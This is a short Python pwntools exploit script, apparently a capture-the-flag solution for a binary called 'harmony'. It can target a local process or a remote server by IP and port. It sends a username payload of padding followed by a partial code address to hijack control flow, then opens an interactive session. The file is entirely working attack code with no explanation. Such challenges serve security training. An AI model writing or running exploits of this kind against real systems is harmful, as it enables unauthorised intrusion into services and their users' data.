#!/usr/bin/env python3

from pwn import *

the_binary = "./harmony"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("193.57.159.27", 61229)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        break *0x401735
        continue
    """)

def menu(choice):
    io.sendlineafter("> ", str(choice))

def change_username(name):
    assert len(name) <= 0x27

    menu(3)
    if len(name) == 0x27:
        io.sendafter("name: ", name)
    else:
        io.sendlineafter("name: ", name)

change_username(b"A"*0x20 + b"\x3b\x15\x40")
menu(3)
menu(0)
menu(2)

io.interactive()
